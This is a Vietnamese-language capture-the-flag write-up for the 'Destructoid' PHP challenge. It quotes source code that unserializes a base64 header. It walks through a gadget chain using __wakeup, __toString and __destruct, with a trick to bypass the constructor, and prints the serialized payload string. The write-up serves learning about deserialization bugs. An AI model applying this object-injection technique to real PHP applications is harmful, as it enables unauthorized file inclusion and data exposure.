# Destructoid
`Road to php god`
+ Infomation: 
  - Link: https://destructoid.chal.imaginaryctf.org/

[image]
Mặc dù không phải là người chơi hệ tâm linh tuy nhiên nhìn vào đây mình cũng đoán ra luôn cái param `?source`.

```php
1 	<?php
2 	$printflag = false;
3	
4 	class X {
5 	   function __construct($cleanup) {
6 	       if ($cleanup === "flag") {
7 	           die("NO!\n");
8 	       }
9 	       $this->cleanup = $cleanup;
10	    }
11	
12	    function __toString() {
13	        return $this->cleanup;
14	    }
15	
16	    function __destruct() {
17	        global $printflag;
18	        if ($this->cleanup !== "flag" && $this->cleanup !== "noflag") {
19	            die("No!\n");
20	        }
21	        include $this->cleanup . ".php";
22	        if ($printflag) {
23	            echo $FLAG . "\n";
24	        }
25	    }
26	 }
27	
28	 class Y {
29	    function __wakeup() {
30	        echo $this->secret . "\n";
31	    }
32	
33	    function __toString() {
34	        global $printflag;
35	        $printflag = true;
36	        return (new X($this->secret))->cleanup;
37	    }
38	 }
39	
40	 if (isset($_GET['source'])) {
41	    highlight_file(__FILE__);
42	    die();
43	 }
44	 echo "ecruos? ym dnif uoy naC\n";
45	 if (isset($_SERVER['HTTP_X_PAYLOAD'])) {
46	    unserialize(base64_decode($_SERVER['HTTP_X_PAYLOAD']));
47	 }	
```
Đề bài cho 2 class X, Y và thêm hàm `unserialize` đứng một mình tại `dòng 46` nghĩa là đây là một bài về lỗi `unserialize`. 
Sau một hồi đọc hiểu code thì mình ra được hướng khai thác như sau `class Y` trigger `__toString` -> `class X` trigger `__destruct`. Đầu tiên là phải trigger cái `__toString` trong class Y để biến `$printflag` được set giá trị `true`. `__toString` là một `magic function` mà mỗi khi object được đối xử như một `string` thì hàm này sẽ được gọi ra ví dự như này:
```php
  $a = new A();
  echo $a;
 ```
 Vì vậy để trigger được cái magic function kia mình sẽ lợi dụng echo ở `dòng 30`. Nghĩa là lúc này `$this->secret = new Y()` hay 
 ```php
 $payload = new Y();
 $a->secret = new Y();
 ```
 
 Tiếp theo để đọc được flag thì tham số truyền vào khi gọi `class X` phải là `flag` tuy nhiên ở hàm `__contructor` của `class X` (lại một magic function nữa) nếu tham số có giá trị là `flag` sẽ lập tức `die()`. Đến lúc này mình bắt đầu nghĩ làm thế nào để 1 giá trị vừa bằng lại vừa khác để thỏa mãn được cả 2 điều kiện ở `dòng 6` và `dòng 18`? Câu trả lời là `KHÔNG CÓ CÁCH NÀO` và phương án mình đưa ra lúc này là làm các nào để không cần gọi đến `__contructor`  mà chỉ gọi đến `__destruct` thôi? Câu trả lời nằm ở đây https://www.programmersought.com/article/43351307730/.

Vậy là chỉ cần sinh ra chuỗi json rồi sửa lại thông số về param để trigger thẳng `__destruct` thôi : 
```php
 $payload = new Y();
 $a->secret = new Y();
 $a->secret->secret = new X('flag');
 // O:1:"Y":1:{s:6:"secret";O:1:"Y":1:{s:6:"secret";O:1:"X":2:{s:7:"cleanup";s:4:"flag";}}}
 ```
 Tuy nhiên chỉ thế này thôi là chưa đủ khi dựng lại môi trường test trên máy local mình nhận ra là biến `$printflag` không hề được set giá trị `true` nên mình đã thử gọi thêm class Y một lần nữa và wala 
 ![image](https://user-images.githubusercontent.com/36907708/127254550-7923b05a-e292-4d47-a5fb-7ace757a31f4.png)
 
 
 gadget : 
 ![image](https://user-images.githubusercontent.com/36907708/127255649-c1539203-c386-40f6-a2f7-f65c3e76f8b9.png)

